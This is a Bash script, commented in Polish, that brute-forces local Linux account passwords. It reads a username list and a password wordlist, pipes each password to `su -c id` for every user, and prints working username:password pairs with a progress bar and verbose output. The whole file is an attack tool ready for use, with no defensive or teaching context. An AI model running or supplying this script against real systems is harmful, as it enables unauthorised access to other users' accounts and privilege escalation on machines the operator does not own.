#!/bin/bash

# Kolory ANSI
RED='\033[0;31m'
RESET='\033[0m'

# Funkcja do wyświetlania paska postępu
show_progress() {
    local current=$1
    local total=$2
    local percent=$((current * 100 / total))
    local bar_size=50
    local filled=$((bar_size * current / total))
    local empty=$((bar_size - filled))

    printf "\r[%-${bar_size}s] %d%%" "$(printf '#%.0s' $(seq 1 $filled))" "$percent"
}

# Sprawdzenie, czy podano wymagane argumenty
if [[ $# -lt 2 ]]; then
    echo "Użycie: $0 <plik z użytkownikami> <plik z hasłami> [-v | -vv]"
    exit 1
fi

# Przechwytywanie plików i opcji
USER_FILE="$1"
PASSWORD_FILE="$2"
VERBOSE=0

# Obsługa przełączników
if [[ "$3" == "-v" ]]; then
    VERBOSE=1
elif [[ "$3" == "-vv" ]]; then
    VERBOSE=2
fi

# Sprawdzenie, czy pliki istnieją
if [[ ! -f "$USER_FILE" ]]; then
    echo "Błąd: Plik z użytkownikami '$USER_FILE' nie istnieje!"
    exit 1
fi

if [[ ! -f "$PASSWORD_FILE" ]]; then
    echo "Błąd: Plik z hasłami '$PASSWORD_FILE' nie istnieje!"
    exit 1
fi

# Liczba użytkowników i haseł
USER_COUNT=$(wc -l < "$USER_FILE")
PASSWORD_COUNT=$(wc -l < "$PASSWORD_FILE")
TOTAL=$((USER_COUNT * PASSWORD_COUNT))
CURRENT=0

# Iterowanie przez użytkowników i hasła
while IFS= read -r user; do
    [[ $VERBOSE -ge 1 ]] && echo "[INFO] Sprawdzanie użytkownika: $user"
    while IFS= read -r pass; do
        [[ $VERBOSE -eq 2 ]] && echo "[INFO] Sprawdzanie: $user:$pass"
        
        # Wywołanie su i sprawdzanie wyniku
        echo "$pass" | su -c "id" "$user" 2>/dev/null && \
        echo -e "${RED}[+] $user:$pass działa!${RESET}" && break

        # Aktualizacja paska postępu
        CURRENT=$((CURRENT + 1))
        show_progress "$CURRENT" "$TOTAL"
    done < "$PASSWORD_FILE"
done < "$USER_FILE"

echo -e "\n[INFO] Proces zakończony."
